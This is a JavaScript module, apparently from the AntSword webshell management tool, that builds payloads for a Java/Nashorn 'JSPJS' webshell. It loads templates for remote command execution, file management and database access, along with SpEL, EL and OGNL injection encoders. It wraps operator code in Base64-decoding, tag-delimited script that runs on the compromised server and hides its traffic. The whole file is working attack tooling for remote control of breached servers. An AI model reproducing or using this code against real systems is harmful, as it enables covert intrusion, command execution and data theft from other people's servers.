/**
 * JSPJS服务端脚本模板
 * 开写：2021/04/06
 * 更新：-
 * 作者：yzddMr6 <https://github.com/yzddmr6>
 */
'use strict';

const Base = require('../base');

class JSPJS extends Base {
  static get supportRawBody() {
    return true;
  }
  constructor(opts) {
    super(opts);
    // 解析模板
    [
      'base',
      'command',
      'filemanager',
      'database/sqlserver',
      'database/mysql',
      'database/oracle'
    ].map((_) => {
      this.parseTemplate(`./jspjs/template/${_}`);
    });
    // 解析编码器
    this
      .encoders
      .map((_) => {
        this.parseEncoder(`./jspjs/encoder/${_}`);
      });
    this
      .decoders
      .map((_) => {
        this.parseDecoder(`./jspjs/decoder/${_}`);
      });
  }

  /**
   * 获取编码器列表
   * ? 可以在antSword.core.php.prototype.encoders中获取此变量
   * @return {array} 编码器列表
   */
  get encoders() {
    return ["spelbase64", "el", "ognl"];
  }

  get decoders() {
      return ["default", "base64", "hex", "b64reverse", "b64rot13"];
    }
    /**
     * HTTP请求数据组合函数
     * @param  {Object} data 通过模板解析后的代码对象
     * @param {bool} force_default 强制使用 default 解码
     * @return {Promise}     返回一个Promise操作对象
     */
  complete(data, force_default = false) {
    // 分隔符号
    let tag_s, tag_e;
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tags']) {
      tag_s = this.__opts__['otherConf']['custom-datatag-tags'];
    } else {
      tag_s = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "->|";
    }
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tage']) {
      tag_e = this.__opts__['otherConf']['custom-datatag-tage'];
    } else {
      tag_e = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "|<-";
    }
    let jspencode = this.__opts__['encode'];

    switch (this.__opts__['encode']) {
      case "UTF8":
        jspencode = "UTF-8";
        break;
      default:
        break;
    }
    let asencCode;
    let ext = {
      opts: this.__opts__,
    };
    if (!force_default) {
      asencCode = this.__decoder__[this.__opts__['decoder'] || 'default'].asoutput(ext);
    } else {
      asencCode = this.__decoder__['default'].asoutput(ext);
    }
    // 组合完整的代码
    let tmpCode = data['_'];

    data['_'] = `
    try {
      load("nashorn:mozilla_compat.js");
    } catch (e) {}
    importPackage(Packages.java.util);
    importPackage(Packages.java.lang);
    importPackage(Packages.java.io);
    var output = new StringBuffer("");
    var cs = "${jspencode}";
    var tag_s = "${tag_s.substr(0,tag_s.length/2)}"+"${tag_s.substr(tag_s.length/2)}";
    var tag_e = "${tag_e.substr(0,tag_e.length/2)}"+"${tag_e.substr(tag_e.length/2)}";
    try {
      function decode(str) {
        str = str.substr(#randomPrefix#);
        var bt=Base64DecodeToByte(str);
        return new java.lang.String(bt,cs);
      }
      function Base64DecodeToByte(str) {
        importPackage(Packages.sun.misc);
        importPackage(Packages.java.util);
        var bt;
        try {
          bt = new BASE64Decoder().decodeBuffer(str);
        } catch (e) {
          bt = Base64.getDecoder().decode(str);
        }
        return bt;
      }
      ${asencCode}
      ${tmpCode}
    } catch (e) {
      output.append("ERROR:// " + e.toString());
    }
    var result=tag_s + asenc(output.toString()) + tag_e;
    try {
      response.getWriter().print(result);
    } catch (e) {
      result;
    }
    `.replace(/\n\s+/g, '').replace(/#randomPrefix#/g, this.__opts__.otherConf["random-Prefix"]);
    // 使用编码器进行处理并返回
    return this.encodeComplete(tag_s, tag_e, data);
  }
}

module.exports = JSPJS;